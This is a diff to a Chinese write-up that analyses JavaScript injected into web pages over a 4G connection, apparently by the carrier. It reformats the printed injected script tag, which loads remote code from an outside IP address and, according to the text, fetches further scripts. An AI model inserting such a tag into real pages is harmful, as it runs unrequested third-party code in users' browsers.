@@ -19,9 +19,9 @@
 
 分别在Wi-Fi和4G下直接获取网页的原始数据，然后分析数据的不同。
 对比了web-4G.html和web-WIFI.html两个不同的数据，发现在`</body>`结束前被被注入了JS代码
-
-`<script type='text/javascript' id='1qa2ws' src='http://221.179.140.145:9090/tlbsgui/baseline/scg.js' mtid='4' mcid='2' ptid='4' pcid='2'></script>`
-
+```
+<script type='text/javascript' id='1qa2ws' src='http://221.179.140.145:9090/tlbsgui/baseline/scg.js' mtid='4' mcid='2' ptid='4' pcid='2'></script>
+```
 这个scg.js下载执行后又下载了一个类似JSON的数据“jsreq”，里面包含了CSS和JS的URL地址。具体分析见如下的代码。
 
 **可见这个被注入的JS最后下载的数据就不止是几个，而是很多。那么见下面的详细分析。**
